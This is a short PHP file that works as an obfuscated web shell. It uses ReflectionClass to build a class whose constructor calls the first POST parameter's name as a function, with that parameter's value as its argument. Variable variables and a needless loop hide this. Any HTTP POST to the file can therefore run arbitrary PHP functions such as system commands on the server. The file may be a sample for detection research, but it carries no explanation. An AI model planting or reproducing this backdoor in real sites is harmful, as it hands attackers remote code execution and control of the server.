<?php
$s0;
$s1;


class Test1
{
    public function __construct($para, $_value)
    {
        $para($_value);
    }
}



$class1 = new ReflectionClass("Test1");
print_r($class1);
foreach (array('_POST') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        for ($i=0;$i<1;$i++) {
            ${"s".$i} = $_key;
        }
        break;
    }
}
$class2 = $class1->newInstance($s0, $_value);
